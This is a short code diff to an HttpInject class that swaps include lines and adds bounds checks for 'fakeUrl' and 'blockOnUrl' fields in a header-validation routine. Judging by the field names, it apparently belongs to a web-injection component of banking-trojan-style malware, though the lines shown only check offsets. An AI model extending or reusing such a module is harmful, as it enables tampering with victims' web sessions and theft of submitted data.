@@ -1,7 +1,5 @@
-#include <windows.h>
-
-
-#include <common/httpinject.h>
+#include "common/rl_kernel.h"
+#include "common/httpinject.h"
 
 void HttpInject::init(void)
 {
@@ -19,8 +17,10 @@ bool HttpInject::_isCorrectHeader(const HEADER *header)
   if(
      header->size              >= sizeof(HEADER) &&
      header->urlMask            < header->size &&
+     header->fakeUrl            < header->size &&
      header->postDataBlackMask  < header->size &&
      header->postDataWhiteMask  < header->size &&
+     header->blockOnUrl         < header->size &&
      header->contextMask        < header->size
     )return true;
   return false;
